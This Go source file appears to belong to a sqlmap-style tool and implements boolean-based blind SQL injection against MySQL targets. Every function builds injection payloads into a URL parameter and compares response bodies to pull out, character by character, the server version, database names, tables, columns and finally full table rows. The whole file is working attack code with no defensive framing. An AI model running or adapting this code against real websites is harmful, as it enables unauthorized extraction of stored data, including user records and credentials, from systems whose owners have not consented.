package line

import (
	"fmt"
	"github.com/EmYiQing/go-sqlmap/constant"
	"github.com/EmYiQing/go-sqlmap/log"
	"github.com/EmYiQing/go-sqlmap/parse"
	"github.com/EmYiQing/go-sqlmap/util"
	"strconv"
	"strings"
)

// GetBoolBlindSuffix 检测盲注的闭合符
func GetBoolBlindSuffix(fixUrl parse.BaseUrl, paramKey string, suffixList []string) (bool, string) {
	temp := fixUrl.Params[paramKey]
	for _, v := range suffixList {
		fixUrl.SetParam(paramKey, temp+v+constant.BlindDetectTruePayload)
		trueResp := fixUrl.SendRequestByBaseUrl()
		fixUrl.SetParam(paramKey, temp+v+constant.BlindDetectFalsePayload)
		falseResp := fixUrl.SendRequestByBaseUrl()
		if string(trueResp.Body) != string(falseResp.Body) {
			fixUrl.SetParam(paramKey, temp)
			return true, v
		}
	}
	fixUrl.SetParam(paramKey, temp)
	return false, ""
}

// GetVersionByBoolBlind 盲注获得版本
func GetVersionByBoolBlind(fixUrl parse.BaseUrl, paramKey string, suffix string) (bool, string) {
	temp := fixUrl.Params[paramKey]
	defaultPayload := temp + suffix + constant.BlindDetectFalsePayload
	fixUrl.SetParam(paramKey, defaultPayload)
	defaultBody := fixUrl.SendRequestByBaseUrl().Body
	var length int
	for i := 1; ; i++ {
		if i > 1000 {
			break
		}
		payload := temp + suffix + constant.Space + "aNd" + constant.Space +
			"length(version())=" + strconv.Itoa(i) + constant.Space + constant.Annotator
		fixUrl.SetParam(paramKey, payload)
		tempResp := fixUrl.SendRequestByBaseUrl()
		if tempResp.Code != -1 {
			if string(tempResp.Body) != string(defaultBody) {
				length = i
				break
			}
		}
	}
	log.InfoLine("mysql version:")
	var data string
	for i := 1; i < length+1; i++ {
		for a := 32; a < 127; a++ {
			tempStr := string(rune(a))
			payload := temp + suffix + constant.Space + "aNd" + constant.Space +
				"left(version()," + strconv.Itoa(i) + ")='" + data + tempStr + "'" +
				constant.Space + constant.Annotator
			fixUrl.SetParam(paramKey, payload)
			tempResp := fixUrl.SendRequestByBaseUrl()
			if tempResp.Code != -1 {
				if string(tempResp.Body) != string(defaultBody) {
					fmt.Print(tempStr)
					data += tempStr
					break
				}
			}
		}
	}
	fmt.Print("\n")
	if len(data) > 0 {
		fixUrl.SetParam(paramKey, temp)
		return true, data
	}
	fixUrl.SetParam(paramKey, temp)
	return false, data
}

// GetCurrentDatabaseByBoolBlind 盲注获得当前数据库
func GetCurrentDatabaseByBoolBlind(fixUrl parse.BaseUrl, paramKey string, suffix string) (bool, string) {
	temp := fixUrl.Params[paramKey]
	defaultPayload := temp + suffix + constant.BlindDetectFalsePayload
	fixUrl.SetParam(paramKey, defaultPayload)
	defaultBody := fixUrl.SendRequestByBaseUrl().Body
	var length int
	for i := 1; ; i++ {
		if i > 1000 {
			break
		}
		payload := temp + suffix + constant.Space + "aNd" + constant.Space +
			"length(database())=" + strconv.Itoa(i) + constant.Space + constant.Annotator
		fixUrl.SetParam(paramKey, payload)
		tempResp := fixUrl.SendRequestByBaseUrl()
		if tempResp.Code != -1 {
			if string(tempResp.Body) != string(defaultBody) {
				length = i
				break
			}
		}
	}
	log.InfoLine("current database:")
	var data string
	for i := 1; i < length+1; i++ {
		for a := 32; a < 127; a++ {
			tempStr := string(rune(a))
			payload := temp + suffix + constant.Space + "aNd" + constant.Space +
				"left(database()," + strconv.Itoa(i) + ")='" + data + tempStr + "'" +
				constant.Space + constant.Annotator
			fixUrl.SetParam(paramKey, payload)
			tempResp := fixUrl.SendRequestByBaseUrl()
			if tempResp.Code != -1 {
				if string(tempResp.Body) != string(defaultBody) {
					fmt.Print(tempStr)
					data += tempStr
					break
				}
			}
		}
	}
	fmt.Print("\n")
	if len(data) > 0 {
		fixUrl.SetParam(paramKey, temp)
		return true, data
	}
	fixUrl.SetParam(paramKey, temp)
	return false, data
}

// GetAllDatabasesByBoolBlind 盲注获得所有数据库
func GetAllDatabasesByBoolBlind(fixUrl parse.BaseUrl, paramKey string, suffix string) {
	temp := fixUrl.Params[paramKey]
	defaultPayload := temp + suffix + constant.BlindDetectFalsePayload
	fixUrl.SetParam(paramKey, defaultPayload)
	defaultBody := fixUrl.SendRequestByBaseUrl().Body
	var count int
	for i := 1; ; i++ {
		if i > 1000 {
			break
		}
		payload := temp + suffix + constant.Space + "aNd" + constant.Space +
			"(select%20count(schema_name)%20from%20information_schema.schemata)=" +
			strconv.Itoa(i) + constant.Space + constant.Annotator
		fixUrl.SetParam(paramKey, payload)
		tempResp := fixUrl.SendRequestByBaseUrl()
		if tempResp.Code != -1 {
			if string(tempResp.Body) != string(defaultBody) {
				count = i
				break
			}
		}
	}
	var data string
	var tempData string
	for c := 0; c < count; c++ {
		for i := 1; ; i++ {
			if i > 1000 {
				break
			}
			payload := temp + suffix + constant.Space + "aNd" + constant.Space +
				"(select%20length(schema_name)%20from%20information_schema.schemata%20limit%20" + strconv.Itoa(c) + ",1)=" +
				strconv.Itoa(i) + constant.Space + constant.Annotator
			fixUrl.SetParam(paramKey, payload)
			tempResp := fixUrl.SendRequestByBaseUrl()
			if tempResp.Code != -1 {
				if string(tempResp.Body) != string(defaultBody) {
					for j := 1; j < i+1; j++ {
						for a := 32; a < 127; a++ {
							tempStr := string(rune(a))
							innerPayload := temp + suffix + constant.Space + "aNd" + constant.Space +
								"left((select%20schema_name%20from%20information_schema.schemata%20limit%20" +
								strconv.Itoa(c) + ",1)," + strconv.Itoa(j) + ")='" + tempData + tempStr + "'" +
								constant.Space + constant.Annotator
							fixUrl.SetParam(paramKey, innerPayload)
							innerResp := fixUrl.SendRequestByBaseUrl()
							if innerResp.Code != -1 {
								if string(innerResp.Body) != string(defaultBody) {
									tempData += tempStr
									break
								}
							}
						}
					}
					log.Info("wait...")
					data = data + tempData + ","
					tempData = ""
				}

			}
		}
	}
	fixUrl.SetParam(paramKey, temp)
	util.PrintDatabases(
		util.ConvertString(
			util.DeleteLastChar(data)))
}

// GetAllTablesByBoolBlind 盲注获得表
func GetAllTablesByBoolBlind(fixUrl parse.BaseUrl, paramKey string, suffix string, database string) {
	temp := fixUrl.Params[paramKey]
	defaultPayload := temp + suffix + constant.BlindDetectFalsePayload
	fixUrl.SetParam(paramKey, defaultPayload)
	defaultBody := fixUrl.SendRequestByBaseUrl().Body
	var count int
	for i := 1; ; i++ {
		if i > 1000 {
			break
		}
		payload := temp + suffix + constant.Space + "aNd" + constant.Space +
			"(select%20count(table_name)%20from%20information_schema.tables%20" +
			"where%20table_schema='" + database + "')=" +
			strconv.Itoa(i) + constant.Space + constant.Annotator
		fixUrl.SetParam(paramKey, payload)
		resp := fixUrl.SendRequestByBaseUrl()
		if resp.Code != -1 {
			if string(resp.Body) != string(defaultBody) {
				count = i
				break
			}
		}
	}
	var data string
	var tempData string
	for c := 0; c < count; c++ {
		for i := 1; ; i++ {
			if i > 1000 {
				break
			}
			payload := temp + suffix + constant.Space + "aNd" + constant.Space +
				"(select%20length(table_name)%20from%20information_schema.tables%20where%20table_schema='" +
				database + "'%20limit%20" + strconv.Itoa(c) + ",1)=" +
				strconv.Itoa(i) + constant.Space + constant.Annotator
			fixUrl.SetParam(paramKey, payload)
			tempResp := fixUrl.SendRequestByBaseUrl()
			if tempResp.Code != -1 {
				if string(tempResp.Body) != string(defaultBody) {
					for j := 1; j < i+1; j++ {
						for a := 32; a < 127; a++ {
							tempStr := string(rune(a))
							innerPayload := temp + suffix + constant.Space + "aNd" + constant.Space +
								"left((select%20table_name%20from%20information_schema.tables%20" +
								"where%20table_schema='" + database + "'%20limit%20" +
								strconv.Itoa(c) + ",1)," + strconv.Itoa(j) + ")='" + tempData + tempStr + "'" +
								constant.Space + constant.Annotator
							fixUrl.SetParam(paramKey, innerPayload)
							innerResp := fixUrl.SendRequestByBaseUrl()
							if innerResp.Code != -1 {
								if string(innerResp.Body) != string(defaultBody) {
									tempData += tempStr
									break
								}
							}
						}
					}
					log.Info("wait...")
					data = data + tempData + ","
					tempData = ""
				}

			}
		}
	}
	fixUrl.SetParam(paramKey, temp)
	util.PrintTables(
		util.ConvertString(
			util.DeleteLastChar(data)))
}

// GetAllColumnsByBoolBlind 盲注获得字段
func GetAllColumnsByBoolBlind(fixUrl parse.BaseUrl, paramKey string, suffix string, database string, table string) {
	temp := fixUrl.Params[paramKey]
	defaultPayload := temp + suffix + constant.BlindDetectFalsePayload
	fixUrl.SetParam(paramKey, defaultPayload)
	defaultBody := fixUrl.SendRequestByBaseUrl().Body
	var count int
	for i := 1; ; i++ {
		if i > 1000 {
			break
		}
		payload := temp + suffix + constant.Space + "aNd" + constant.Space +
			"(select%20count(column_name)%20from%20information_schema.columns%20" +
			"where%20table_name='" + table + "'%20and%20table_schema='" + database + "')=" +
			strconv.Itoa(i) + constant.Space + constant.Annotator
		fixUrl.SetParam(paramKey, payload)
		resp := fixUrl.SendRequestByBaseUrl()
		if resp.Code != -1 {
			if string(resp.Body) != string(defaultBody) {
				count = i
				break
			}
		}
	}
	var data string
	var tempData string
	for c := 0; c < count; c++ {
		for i := 1; ; i++ {
			if i > 1000 {
				break
			}
			payload := temp + suffix + constant.Space + "aNd" + constant.Space +
				"(select%20length(column_name)%20from%20information_schema.columns%20where%20table_schema='" +
				database + "'%20and%20table_name='" + table + "'%20limit%20" + strconv.Itoa(c) + ",1)=" +
				strconv.Itoa(i) + constant.Space + constant.Annotator
			fixUrl.SetParam(paramKey, payload)
			tempResp := fixUrl.SendRequestByBaseUrl()
			if tempResp.Code != -1 {
				if string(tempResp.Body) != string(defaultBody) {
					for j := 1; j < i+1; j++ {
						for a := 32; a < 127; a++ {
							tempStr := string(rune(a))
							innerPayload := temp + suffix + constant.Space + "aNd" + constant.Space +
								"left((select%20column_name%20from%20information_schema.columns%20" +
								"where%20table_schema='" + database + "'%20and%20table_name='" + table + "'%20limit%20" +
								strconv.Itoa(c) + ",1)," + strconv.Itoa(j) + ")='" + tempData + tempStr + "'" +
								constant.Space + constant.Annotator
							fixUrl.SetParam(paramKey, innerPayload)
							innerResp := fixUrl.SendRequestByBaseUrl()
							if innerResp.Code != -1 {
								if string(innerResp.Body) != string(defaultBody) {
									tempData += tempStr
									break
								}
							}
						}
					}
					log.Info("wait...")
					data = data + tempData + ","
					tempData = ""
				}

			}
		}
	}
	fixUrl.SetParam(paramKey, temp)
	util.PrintColumns(
		util.ConvertString(
			util.DeleteLastChar(data)))
}

// GetAllDataByBoolBlind 盲注获得数据
func GetAllDataByBoolBlind(fixUrl parse.BaseUrl, paramKey string, suffix string, database string, table string, columns []string) {
	temp := fixUrl.Params[paramKey]
	defaultPayload := temp + suffix + constant.BlindDetectFalsePayload
	fixUrl.SetParam(paramKey, defaultPayload)
	defaultBody := fixUrl.SendRequestByBaseUrl().Body

	tempPayload := "concat("
	for _, v := range columns {
		tempPayload = tempPayload + v + ",0x3a,"
	}
	r := []rune(tempPayload)
	result := string(r[:len(r)-6])
	tempPayload = result + ")"

	var count int
	for i := 1; ; i++ {
		if i > 1000 {
			break
		}
		payload := temp + suffix + constant.Space + "aNd" + constant.Space +
			"(select%20count(" + tempPayload + ")%20from%20" + database + "." + table + ")=" +
			strconv.Itoa(i) + constant.Space + constant.Annotator
		fixUrl.SetParam(paramKey, payload)
		resp := fixUrl.SendRequestByBaseUrl()
		if resp.Code != -1 {
			if string(resp.Body) != string(defaultBody) {
				count = i
				break
			}
		}
	}
	var data []string
	var tempData string
	for c := 0; c < count; c++ {
		for i := 1; ; i++ {
			if i > 1000 {
				break
			}
			payload := temp + suffix + constant.Space + "aNd" + constant.Space +
				"(select%20length(" + tempPayload + ")%20from%20" + database + "." +
				table + "%20limit%20" + strconv.Itoa(c) + ",1)=" +
				strconv.Itoa(i) + constant.Space + constant.Annotator
			fixUrl.SetParam(paramKey, payload)
			resp := fixUrl.SendRequestByBaseUrl()
			if resp.Code != -1 {
				if string(resp.Body) != string(defaultBody) {
					for j := 1; j < i+1; j++ {
						for a := 32; a < 127; a++ {
							tempStr := string(rune(a))
							innerPayload := temp + suffix + constant.Space + "aNd" + constant.Space +
								"left((select%20" + tempPayload + "%20from%20" + database + "." + table + "%20limit%20" +
								strconv.Itoa(c) + ",1)," + strconv.Itoa(j) + ")='" + tempData + tempStr + "'" +
								constant.Space + constant.Annotator
							fixUrl.SetParam(paramKey, innerPayload)
							innerResp := fixUrl.SendRequestByBaseUrl()
							if innerResp.Code != -1 {
								if string(innerResp.Body) != string(defaultBody) {
									tempData += tempStr
									break
								}
							}
						}
					}
					log.Info("wait...")
					data = append(data, tempData)
					tempData = ""
				}

			}
		}
	}
	log.Info("get data success")
	var output [][]string
	for _, v := range data {
		var innerTemp []string
		params := strings.Split(v, ":")
		for _, innerV := range params {
			innerTemp = append(innerTemp, innerV)
		}
		output = append(output, innerTemp)
	}
	fixUrl.SetParam(paramKey, temp)
	util.PrintData(util.ConvertInterfaceArray(columns, output))
}
